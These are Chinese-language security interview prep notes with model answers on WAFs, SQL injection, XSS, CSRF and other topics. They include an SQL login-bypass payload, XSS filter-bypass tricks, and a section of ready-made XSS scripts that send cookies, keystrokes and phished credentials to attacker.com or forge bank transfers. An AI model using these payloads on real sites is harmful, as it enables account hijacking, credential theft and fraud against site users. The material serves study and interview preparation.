# 面试问题

## Q: 你了解WAF吗？手撕一个WAF来看看？

**反问问题含义**

你好面试官，请问你是希望我实现一个基础的WAF的核心逻辑还是完整的架构设计？这个WAF防御的攻击类型是否有侧重？



**强调基本观点**

==WAF不止正则==



**解释WAF技术**

WAF的核心是通过多层检测机制识别恶意流量

- 最早就是利用静态规则也就是设置一些规则来识别异常的参数，如正则表达式、http协议包参数限制，以及对参数进行编解码后分析逻辑结构
- 然后WAF也有进行IP的行为分析，比如拦截短时间的大量异常访问，拉黑已知恶意IP、识别Cookie篡改
- 目前的WAF有利用机器学习或者大模型来实现通过历史流量训练模型，识别出一些非正常请求，或者自主生成一些新的规则来应对nday甚至0day的攻击
- 当然对于nday之类的漏洞打上虚拟补丁根据漏洞的特征进行拦截即可。
- 还有就是进行沙箱检测，对于一些用户上传的不可信的文件可以在隔离环境中做检测，防止webshell等攻击。



**手撕正则WAF**

但是对于个人而言，最容易接触的就是基于正则表达式构建的初级WAF，这里就以`Python`的`Flask`作为演示,实现几个比较基础的正则WAF：

一个是SQL注入检测

```python
# SQL注入检测
def waf_SQLInjection(request):
	sql_Injection_patterns = [r"('|--|;|union|select|drop|#)"]
    for param in request.args.values():
        if any(re.search(pattern,param,re.I) for pattern in sql_Injection_patterns):
            return "SQL Injection Hacker!"
    # 处理其他业务逻辑
    return "Good!"
```

XSS检测：

```python
def waf_XSSInjection(request):
    xss_patterns = [r"<script>", r"onerror=",r"onmouseover"]
    if any(re.search(pattern, request.path) for pattern in xss_patterns):
        return "XSS Injection Hacker!"
   	# 处理其他业务逻辑
    return "Good!"
```



**总结WAF**

综上





## Q: 你了解SQL注入吗？说一说SQL注入？

**解释基本定义**

你好面试官！SQL注入就是攻击者通过构造恶意输入，篡改程序中的SQL查询逻辑，从而非法访问或者破坏数据库的攻击方式。



SQL注入出现的原理就是开发者没有对用户输入做出充分过滤和检测，并且程序中的SQL查询语句是使用字符串拼接的方式进行构造的前提下，攻击者就可以通过精心构造的特殊字符改变该SQL语句的原始语义。



**案例解释注入**

比如一个最基本的登陆页面的判定，没有对用户输入的数据的过滤和处理：

```
SELECT * FROM users WHERE username='{user_input}' AND password='{password}'
```



攻击者可以提交如下payload进行提交

```
user_input = admin '--
password = 随意数据
```



然后原始的语句变为，就可以实现任意密码登录的效果

```
SELECT * FROM users WHERE username='admin' -- AND password='{随意数据}'
```



**检测方法讲解**

检测一个查询框是否出现SQL注入的方法：

1. 手动测试，尝试特殊字符，如单引号、双引号、括号、分号以及各种排列组合和一些逻辑上恒唯一的语句(1 or 1=1#)
2. 自动化工具：SQLMap自动检测注入点
3. 代码审计：D盾、Seay代码审计，乃至如今的大模型进行自动审计代码
4. 流量分析：出现异常的union select等请求，可能是黑客利用尚未检测的漏洞进行攻击



**防御方法讲解**

1. 对用户输入的数据进行检测过滤，正则匹配永远是防御第一步要做的也是最简单的可以做的，比如使用库函数，如PHP的`mysqli_real_escape_string()`函数进行转义参数
2. 自动化生成参数化查询，避免手写一些出现漏洞的SQL查询语句
3. 最小权限原则，就是让使用该数据库的网站可以使用的权限最小化
4. 自定义错误页面，增加攻击者攻击的难度
5. 防止SQL注入最安全的做法就是预编译语句



**手撕预编译语句**

这里使用Python来写一个预编译的语句作为展示

```python
# 模拟用户登录的函数
def login(username, password):
    # 使用预编译语句来防止SQL注入
    cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
    user = cursor.fetchone()
    
    if user:
        print("登陆成功!")
    else:
        print("登录失败")
```



其中 `?`就是占位符，传入的变量会被安全的处理



## Q: SQL注入的时候是手动测试还是自动化工具？

你好面试官，这个问题在网络安全学习的初始阶段肯定是手动测试学习开始，这样子更能学习SQL的原理和防御措施。然后实际网站的测试中也会先经过手动测试，自动化工具在大规模快速扫描方面是人工不能替代的，这节省了很大的时间成本，但是SQLMap通常不能处理复杂逻辑、WAF绕过等场景。

然后在复杂的注入场景如二次注入、绕过防御机制的注入、针对特定参数设计的攻击都需要手动测试

一般来说

通常会先用自动化工具进行初步扫描，标记潜在风险点，再通过手动测试深入验证和漏洞利用。例如：

1. 用SQLMap快速扫描URL参数，发现可疑注入点。
2. 手动分析数据库错误日志、HTTP响应差异（如时间延迟、内容变化），确认漏洞存在性。
3. 构造定制化Payload测试过滤规则的绕过可能性。"





## Q: 你了解XSS吗？说一说XSS？

**解答定义**

“XSS（跨站脚本攻击）是一种通过向网页注入恶意脚本（通常是JavaScript）来攻击用户的安全漏洞。攻击者可以利用它窃取用户Cookie、劫持会话或进行钓鱼攻击。



**XSS分类**

- 反射型XSS：通过URL参数注入
- 存储型XSS：恶意脚本存储在服务器，如评论区，页面访问页面时自动触发
- DOM型：客户端JS直接操作DOM时未过滤输入，不经过服务器端处理



**攻击出现原理**

关键就是开发者未对用户的输入进行过滤和输出转义



**绕过技巧**



- 编码绕过：使用Unicode、HTML实体或JS编码混淆恶意代码（如`\u003cscript\u003e`）。
- 事件处理器触发：利用`onerror`、`onmouseover`等属性（如`<img src=x onerror=alert(1)>`）。
- 绕过CSP：通过允许的外部域托管恶意脚本，或利用JSONP端点动态加载代码。

- 绕过正则表达检测：大小写混淆（`<ScRiPt>`）、拆分字符串（`<scr<script>ipt>`）、利用HTML特殊属性（如`<svg/onload>`）。



**防御手段**

**1. 输入过滤与输出编码**

```
// 使用 DOMPurify 过滤 HTML
const clean = DOMPurify.sanitize(userInput);
```



**2. CSP策略确保来源安全**

```
Content-Security-Policy: default-src 'self'; script-src 'nonce-随机值'
```



**3. HttpOnly Cookie**

```
Set-Cookie: session=xxx; HttpOnly; Secure
```



4.使用安全库：如DOMPurify对HTML做净化，或`encodeURIComponent`处理URL参数。

5.避免`innerHTML`，优先使用`textContent`。

6.定期进行安全扫描和渗透测试，关注OWASP Top 10更新。





## Q: 反射型的XSS的危害是什么？

反射型 XSS 的核心危害是会话劫持，虽然反射型XSS无法直接窃取服务器信息，但是它可以通过窃取用户的Cookie或者Session Token间接获取服务器权限

```
<script>fetch('https://attacker.com/steal?data=' + document.cookie)</script>
```

用户点击恶意链接后，攻击者可利用 Cookie 以用户身份登录系统，访问其私有数据（如订单、聊天记录、支付信息等）。

服务器信息泄露的边界是模糊的：用户账户本身可能就是服务器数据的访问入口（如管理员账户）。



反射型 XSS 常通过钓鱼邮件、伪装链接传播，攻击者可结合社会工程手段诱导用户点击。

例如：伪装成银行通知链接：`https://legit-bank.com?search=<script>恶意代码>`。

用户点击后，攻击者可以：伪造登录页面窃取凭据，通过 DOM 操作覆盖页面内容，静默发起转账请求（通过 JavaScript 调用后端 API），植入键盘记录器（记录用户后续操作



反射型 XSS 可作为漏洞链的跳板


单一漏洞可能危害有限，但反射型 XSS 可与其他漏洞结合形成攻击链，可以通过 XSS 绕过 CSRF 防护（注入恶意代码伪造 POST 请求），可以配合浏览器漏洞（如 CVE 漏洞）实现远程代码执行（RCE），也可以在内部系统中利用 XSS 横向移动（如攻击企业内网应用）。



**回应话术建议**

反射型 XSS 的危害可能不如存储型直接，但它的核心风险在于：

1. 它是用户身份和权限的入口漏洞，攻击者一旦劫持会话，就能以用户身份访问服务器数据；
2. 它依赖社会工程，而社会工程是真实攻击中最高效的手段之一（参考钓鱼攻击成功率超 30% 的统计数据）；
3. 现代 Web 应用中，用户侧的数据（如个人隐私、操作行为）本身也是业务核心资产，反射型 XSS 的防护是合规刚需。
   因此，反射型 XSS 的修复优先级不应低于其他漏洞类型。”



## Q: 写几个高危XSS脚本？

**窃取用户Cookie**

```js
// 反射型/存储型 XSS 示例：将用户 Cookie 发送到攻击者服务器
<script>
  const img = new Image();
  img.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```



**构造CSRF请求（强制用户执行操作）**

```js
// 反射型 XSS + CSRF 组合攻击：静默发起转账请求
<script>
  fetch('https://bank.com/transfer', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ to: 'attacker_account', amount: 1000 })
  });
</script>
```



**键盘记录器（窃取敏感输入）**

```js
// DOM 型 XSS：记录用户键盘输入并外传
<script>
  document.addEventListener('keypress', (e) => {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>
```



**钓鱼页面覆盖（伪造登录弹窗）**

```js
// 反射型 XSS：覆盖页面内容，诱导用户输入凭据
<script>
  document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;background:red;padding:20px;">
      <h1>系统安全警告！请重新登录：</h1>
      <input id="username" placeholder="用户名">
      <input id="password" type="password" placeholder="密码">
      <button onclick="steal()">提交</button>
    </div>
  `;
  function steal() {
    const u = document.getElementById('username').value;
    const p = document.getElementById('password').value;
    fetch('https://attacker.com/steal?u=' + u + '&p=' + p);
  }
</script>**浏览器漏洞利用（升级为RCE）**
```



**存储型XSS（污染数据库）**

```js
// 存储型 XSS 示例：用户评论字段注入
用户提交评论内容：
  <script>
    window.open('https://attacker.com/malware');
  </script>
```







## Q: 怎么保证网络游戏的实时性，以英雄联盟为例？

这个问题建议就是从技术架构、网络协议、算法优化、基础设施等多个维度进行系统性设计。

- 网络传输层优化

游戏为了保证延时低的性质，肯定是选择UDP协议作为主要的传输协议，但因为UDP原生并没有自主纠错和校验的功能，然后可以自定义可靠层如(RakNet)实现关键的数据包重传和确认机制，比如玩家技能释放、坐标位置的更新。

对数据进行优化和压缩，重点就是保证增量更新，仅仅传输状态变化量而不是全量数据，比如更新坐标的时候仅仅发送坐标差值，而非完整坐标。

在关键的数据包中加入冗余信息，比如购买装备、野区资源争夺(大小龙、巢虫、先锋、厄塔汗等)，减少丢包带来的游戏重大影响。



- 服务器端架构设计

由于玩家的位置不是物理上的聚集，所以玩家离服务器的远近就会导致游戏中的延迟高低，游戏中应该结合CDN网络降低物理距离导致的延迟问题，使用一些判断机制，将玩家的路由到最近的接入点。

所有关键逻辑在服务器端执行，并且服务器采用分帧处理，确保玩家的状态是同步的，不会说同一攻击，本地机器性能较好的反而能更快攻击到。

负载均衡，LOL中的一把对局10人一个游戏房间，服务器要动态分配，避免单点过载，以及自动实现扩缩容，应对团战或者恶意攻击服务器导致的突发流量。



- 客户端实时性保障

客户端采用一定的技能或移动的预测算法，此结果先在本地执行后由服务器验证修正

插值补偿，避免画面瞬移

本地预加载地图资源、技能特效，减少对战的时候因为非关键数据的运行卡顿。



- 同步机制

高频低优先级数据采用UDP状态同步，比如玩ADC的时候经常有走A的操作，这些操作的优先级不是很高但是高频，所以可以采用UDP状态同步坐标信息。

低频优先级高的使用可靠传输

延迟补偿技术，LOL有一项判定必要容易出问题的就是回滚和回溯的问题，服务器根据玩家延迟回滚时间戳，模拟过去的命中判定



- 基础设施

合作部署骨干网，减少路由跳数

自适应网络状态的最优传输路径



- 特殊场景设计

跨区域对战就是用延时平衡算法，对局匹配的时候尽量将网络状态类似的人群匹配到同一游戏空间

大规模团战的优化，本地技能根据分级降低渲染特效的效果，服务器端自适应识别团战中的突发流量，短时间将同步频率进行提升，提高玩家的对局体验。







## Q: 你了解CSRF吗？说一说CSRF漏洞？

```
面试官提问你了解CSRF吗？说一说CSRF，我是一个面试小白，我不明白面试官的问法的用意在于何处？我应该从什么方便进行回答？从CSRF定义、原理、WAF、开发时如何减少CSRF的出现、CSRF如何绕过？它和哪个漏洞容易搞混？还是说有更多我没有提及到的方面、或者是我遗漏的地方进行回答和得分？你能说一下如果你去面试，你如何回答？
```

**漏洞定义**

**CSRF(跨站请求伪造)** 是一种利用用户已认证的身份，在用户不知情的情况下发起恶意请求的攻击

- **攻击条件**：用户已登录目标网站（携带会话Cookie），且浏览器自动发送身份凭证。
- **攻击方式**：攻击者诱导用户访问恶意页面（如钓鱼链接、图片），该页面自动向目标站点发送伪造请求（如转账、改密）。

```
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```



**防御措施**

- CSRF Token：服务端生成随机Token嵌入表单或请求头，验证请求合法性（如Django内置中间件）。
- SameSite Cookie属性：设置`SameSite=Strict/Lax`，限制跨站请求携带Cookie（Lax允许安全方法如GET）。
- 验证Referer/Origin头：检查请求来源是否合法域名，但需注意隐私策略和可能的绕过。
- 关键操作使用POST：避免敏感操作通过GET实现，增加攻击复杂度。
- 双重提交验证：Token同时存在于Cookie和请求体中，服务端比对两者一致性。



**CSRF绕过姿势**

- Referer绕过：
  - 利用HTTPS→HTTP降级导致Referer缺失。
  - 服务器配置不严格（如仅检查域名存在性）。
- Token泄露：通过XSS、页面缓存或网络嗅探获取Token。
- 宽松的SameSite配置：若Cookie为`SameSite=None`且未加密，可能被中间人攻击利用。



## Q: CSRF和XSS的区别？

XSS：通过注入恶意脚本窃取信息或操作客户端，攻击发生在目标站点内。

CSRF：利用用户身份发起请求，依赖用户已登录状态，攻击来自第三方站点。



## Q: 你抓过包吗？可以说一下怎么从流量层面判断攻击类型？比如ssh登录爆破的流量特征？





## Q: 说一下webshell的流量特征？



## Q: 信息安全三要素是什么？



## Q: 你有进行过实际渗透吗？详细说说？



## Q: 说一说你了解什么Java漏洞？说一下Log4j是什么原理？



## Q: 非对称加密和对称加密的对比？非对称加密怎么保证安全的？



## Q: fastjson漏洞原理知道吗？



## Q: 反序列化说一下是什么情况？java反序列化？



## Q: redis未授权怎么打？这个漏洞是什么原理说一说？



## Q: 正向代理和反向代理有什么区别？举例说明



## Q: http协议请求体结构，请求方法有什么？响应码有什么？分别代表什么含义？



## Q: 使用过nmap吗？你说一说这个工具的参数和运行命令？



## Q: 浏览器内核和架构了解过吗？哪个引擎负责dom树的解析？









## Q: 对于目前火爆的DeepSeek等人工智能有什么了解和想法吗？



## Q: 你了解过网安方面的大模型吗？说一下他们的功能和区别？



## Q: 你对你未来的规划和从事的网络安全的方向有什么计划？







## Q: 请你说一下Linux中kill -9 [PID]的底层原理？

kill默认给指定进程发送一个信号，比如-15，就是温和的终止方式，进程在接收到-15信号也就是`SIGTERM`的时候，会在结束前做一些清理工作。

-9发送的是`SIGKILL` 信号，这个信号接收到，内核会立刻立刻终止该进程。

内核层面就是

- 系统通过进程标识符<PID> 来定位用于管理进程的进程控制块<PCB>
- <PCB>里面存储着一个进程的各种状态信息，一些基本的状态、程序计数器、寄存器等都在里面
- -9信号接收之后，<PCB>里面的进程状态会立刻设置为终止
- 内核立刻释放进程占用的系统资源
- -9绕过了进程的可能信号处理程序，拥有最高优先级处理级别。





## Q: 请你说一下磁盘文件上云的流程？

- 磁盘读取，判断页缓存是否有数据，有的话直接用，没有就缺页中断，将数据加载到页缓存里
- 数据处理与拷贝，CPU将数据从页缓存拷贝到内核的套接字缓冲区，这就是用户态和内核态的上下文切换。这里面可能会出现零拷贝
- 协议封装，传输层将数据分割为小的数据段，封装TCP报文头，MAC地址啥的
- 网卡传输，协议栈处理完之后产生软中断通知网卡驱动，驱动从套接字缓冲区读取数据之后，通过DMA技术将数据拷贝到网卡的数据缓冲区，网卡再进行发送。





\## 长亭科技攻防实习生（红队，部分问题记录）： 文件上传绕过方式？ csp防护的原理，在响应头怎么的写法？ 反序列化 代码审计，细节，java 渗透腾讯资产的全流程，说一下你的思路 php不同版本号的漏洞存在 php反序列化 ## 长亭科技安全服务实习生（渗透方向） sql注入的原理，和二次注入的原理 sql注入列数不匹配 sql注入怎么确定数据库的版本号 xss禁用alert，怎么来测试无回显，无弹窗的 文件上传漏洞怎么绕过 数据分析方面那怎么应用在网络安全方面 内网渗透通道怎么建立，有几种模式 内网渗透不能扫描的情况，怎么去横向移动 内网渗透的流程 内网渗透多了解一点







